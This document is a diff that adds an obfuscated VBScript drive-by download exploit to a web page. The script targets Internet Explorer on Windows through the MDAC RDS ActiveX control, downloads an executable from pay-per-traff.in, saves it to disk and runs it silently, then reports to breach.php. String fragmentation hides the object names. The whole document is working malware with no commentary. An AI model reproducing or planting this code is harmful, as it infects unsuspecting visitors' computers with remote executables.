@@ -1,0 +1,184 @@
+<SCRIPT language="VBScript">
+url3 = "http://pay-per-traff.in/bot/exe.exe"
+url4 = "http://pay-per-traff.in/bot/exe.exe"
+Function GTCLS()
+aa1="cls"
+aa2="id:"
+aa3="BD9"
+aa4="6C5"
+aa5="56-"
+aa6="65A"
+aa7="3-1"
+aa8="1D0"
+aa9="-98"
+aa0="3A-"
+a10="00C"
+a11="04F"
+a12="C29"
+a14="E36"
+GTCLS = aa1&aa2&aa3&aa4&aa5&aa6&aa7&aa8&aa9&aa0&a10&a11&a12&a14
+End Function
+If navigator.appName="Microsoft Internet Explorer" Then
+If InStr(navigator.platform,"Win32") <> 0  Then
+Const Mod_rwrt=3
+Const Mod_tpbr=1
+Const Mod_cowr=2
+Dim  xFRD
+Dim  xXMT
+Dim  xFSD
+Dim  xStr
+Dim  xWSh
+Dim  xSha
+Dim  xfns
+Dim  xMBD
+Dim  xPgf
+Dim  cByte
+Dim  ObjName
+Dim  ObjProg
+a15 = "ex"
+a16 = "."
+a17 = "obj"
+a18 = "ect"
+a19 = "id"
+a20 = "She"
+a21 = "ll."
+a22 = "App"
+a23 = "lic"
+a24 = "ati"
+a25 = "Micro"
+a26 = "soft"
+a27 = "XM"
+a28 = "LH"
+a29 = "TTP"
+a30 = "G"
+a31 = "ET"
+a32 = "0"
+a33 = "DOD"
+a34 = "Str"
+a35 = "eam"
+a37 = "Scr"
+a38 = "ipt"
+a39 = "ing"
+a40 = ".Fi"
+a41 = "leS"
+a42 = "yst"
+a43 = "emO"
+a44 = "bje"
+a45 = "ct"
+a46 = "WSc"
+a47 = "rip"
+a48 = "t.S"
+a49 = "hel"
+a50 = a46&a47&a48&a49
+a36=a37&a38&a39&a40&a41&a42&a43&a44&a45
+Set  xFRD=document.createElement(a17+a18)
+xFRD.setAttribute a19,"xFRD"
+xFRD.setAttribute "classid",GTCLS
+Set xSha = xFRD.CreateObject(a20 & a21 & a22 & a23 & a24 & "on","")
+xfns="..//957123844" & a16 & a15 & "e"
+set xXMT = CreateObject(a25 & a26 & "." & a27 & a28 & a29)
+HTTPSession=xXMT.Open(a30 & a31,url3,a32)
+xXMT.Send()
+On Error Resume Next
+xMBD=xXMT.responseBody
+On Error Resume Next
+Set xStr=xFRD.CreateObject("A" & a33 & "B" & "." & a34 & a35,"")
+If Err.number <> 0 Then
+Set xFSD=xFRD.CreateObject(a36,"")
+Set xPgf=xFSD.CreateTextFile(xfns, true)
+Pllen=LenB(xMBD)
+For j=1 To Pllen
+cByte=MidB(xMBD,j,1)
+ByteCode=AscB(cByte)
+xPgf.Write(Chr(ByteCode))
+Next
+xPgf.Close
+Set  xWSh=xFRD.CreateObject(a50 & "l","")
+On Error Resume Next
+xWSh.Run (xfns),1,FALSE
+Else
+xStr.Mode=Mod_rwrt
+xStr.Type=Mod_tpbr
+xStr.Open
+xStr.Write xMBD
+xStr.SaveToFile xfns,Mod_cowr
+Function getexec1()
+on error resume next
+xSha.ShellExecute xfns
+End Function
+randomize
+rnfx0000=round(rnd*99999)
+call getexec1
+if Err.Number = 0 then
+Set Http = CreateObject("Microsoft.XMLHTTP")
+Http.Open "GET", "breach.php?mdac=" & rnfx0000, false
+Http.Send
+end if
+End If
+End If
+End If
+on error resume next
+a51 = "clas"
+a52 = "sid"
+a53 = a51&a52
+a55 = "Micr"
+a56 = "osoft"
+a57 = ".XM"
+a58 = "LHT"
+a59 = "TP"
+a60 = "obj"
+a61 = "ect"
+a62 = "A"
+a63 = "dod"
+a64 = "b.St"
+a65 = "re"
+a66 = "am"
+a67 = a62&a63&a64&a65&a66
+a68 = "G"
+a69 = "ET"
+a70 = a68&a69
+a71 = a70
+a72 = a71
+a73 = "e"
+a74 = "x"
+a75 = "."
+a76 = "Scr"
+a77 = "ipti"
+a78 = "ng.Fi"
+a79 = "leSys"
+a80 = "temO"
+a81 = "bject"
+a82 = a76&a77&a78&a79&a80&a81
+a83 = a82
+a84 = "She"
+a85 = "ll."
+a86 = "App"
+a87 = "lic"
+a88 = "ati"
+a89 = a84&a85&a86&a87&a88
+a90 = a89
+Set a54 = document.createElement(a60&a61)
+a54.setAttribute a53,GTCLS
+Set x = a54.CreateObject(a55&a56&a57&a58&a59,"")
+set Yzx = a54.createobject(a67,"")
+Yzx.type = 1
+x.Open a72, url4, false
+x.Send
+fnmzzzzs="..//957123845" & a75 & a73 & a74 & a73
+set FF = a54.createobject(a83,"")
+set tempfiles = F.GetSpecialFolder(2)
+fnmzzzzs= FF.BuildPath(tempfiles,fnmzzzzs)
+Yzx.open
+Yzx.write x.responseBody
+Yzx.savetofile fnmzzzzs,2
+Yzx.close
+Function getexec2()
+on error resume next
+set MM = a54.createobject(a90&"on","")
+MM.ShellExecute fnmzzzzs,"","","open",0
+End Function
+randomize
+rnfx0001=round(rnd*99999)
+call getexec2
+</script>
+</html>
